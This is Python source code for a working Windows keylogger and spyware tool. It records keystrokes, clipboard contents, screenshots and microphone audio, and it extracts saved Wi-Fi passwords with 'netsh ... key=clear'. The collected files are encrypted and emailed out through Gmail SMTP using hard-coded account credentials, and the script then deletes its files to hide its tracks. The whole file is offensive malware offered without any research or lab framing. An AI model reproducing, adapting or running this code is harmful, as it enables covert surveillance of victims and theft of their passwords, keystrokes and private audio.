# Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
import subprocess
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Start up instances of files and paths

system_information = "system.txt"
audio_information = "audio.wav"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
keys_information = "key_log.txt"
wifi_password = "wifi_password.txt"
extend = "\\"

# Encrypted Files
system_information_e = 'e_system.txt'
clipboard_information_e = 'e_clipboard.txt'
keys_information_e = 'e_keys_logged.txt'
wifi_password_e = 'e_wifi_password.txt'

username = getpass.getuser()

file_path =  "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\" # Could use any directory here

# Time Controls
time_iteration = 15 # 7200 # 2 hours
number_of_iterations_end = 2 # 5000
microphone_time = 10 # 600 is 10 minutes

# Email Controls
email_address = "completekeyloggerproject@gmail.com"
password = "w72Q%OtMppzA#CDjg#3"

# Send to email address
toaddr = "completekeyloggerproject@gmail.com" # Use a temporary mail service address, mailinator and temp mail are good services

# Key to Encrypt
key = "MY_GV0kCIr1ZIBVka92wvyGO6kxro-k1tC8Gyj8WMaY=" # generate encryption key and enter into here

#######################################################

# Send to email
def send_email(filename, attachment, toaddr):
    # Source code from geeksforgeeks.org

    fromaddr = email_address

    # instance of MIMEMultipart
    msg = MIMEMultipart()

    # storing the senders email address
    msg['From'] = fromaddr

    # storing the receivers email address
    msg['To'] = toaddr

    # storing the subject
    msg['Subject'] = "Log File"

    # string to store the body of the mail
    body = "Body_of_the_mail"

    # attach the body with the msg instance
    msg.attach(MIMEText(body, 'plain'))

    # open the file to be sent
    filename = filename
    attachment = open(attachment, "rb")

    # instance of MIMEBase and named as p
    p = MIMEBase('application', 'octet-stream')

    # To change the payload into encoded form
    p.set_payload((attachment).read())

    # encode into base64
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    # attach the instance 'p' to instance 'msg'
    msg.attach(p)

    # creates SMTP session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # start TLS for security
    s.starttls()

    # Authentication
    s.login(fromaddr, password)

    # Converts the Multipart msg into a string
    text = msg.as_string()

    # sending the mail
    s.sendmail(fromaddr, toaddr, text)

    # terminating the session
    s.quit()

# Get Computer and Network Information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get('https://api.ipify.org').text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Couldn't get IP Address to do max query\n")

        f.write("Processor: " + (platform.processor() + "\n"))
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


computer_information()

# Gather clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied.")

def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)


microphone()
send_email(audio_information, file_path + extend + audio_information, toaddr)

# Screenshot functionalities
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

# Takes one screenshot. If you do not have this statement, the executable will not end and won't take a screenshot
if __name__ == "__main__":
    freeze_support()
    Process(target=screenshot).start()

def wifi_passwords():
    with open(file_path + extend + wifi_password, "w") as f:
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split(
                '\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                f.write("{:<30} -  {:<}\n".format(i, results[0]))
            except IndexError:
                f.write("{:<30} -  {:<}\n".format(i, ""))



copy_clipboard()
wifi_passwords()


# Time controls for keylogger
number_of_iterations = 0
currentTime = time.time()
stoppingTime = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    counter = 0

    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'","")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stoppingTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:
        # Clear contents of keylogger log file.
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ")
        # Take a screenshot and send to email
        screenshot()
        send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
        # Gather clipboard contents and send to email
        copy_clipboard()
        # Increase iteration by 1
        number_of_iterations += 1
        # Update current time
        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

file_merge = file_path + extend

files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information, file_merge + wifi_password]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e, file_merge + wifi_password_e]
count = 0


for encrypting_files in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 1

time.sleep(120) # Sleep two minutes before deleting all files


# Delete files - clean up our tracks
delete_files = [system_information, clipboard_information, keys_information, screenshot_information, wifi_password]
for file in delete_files:
    os.remove(file_path + extend + file)


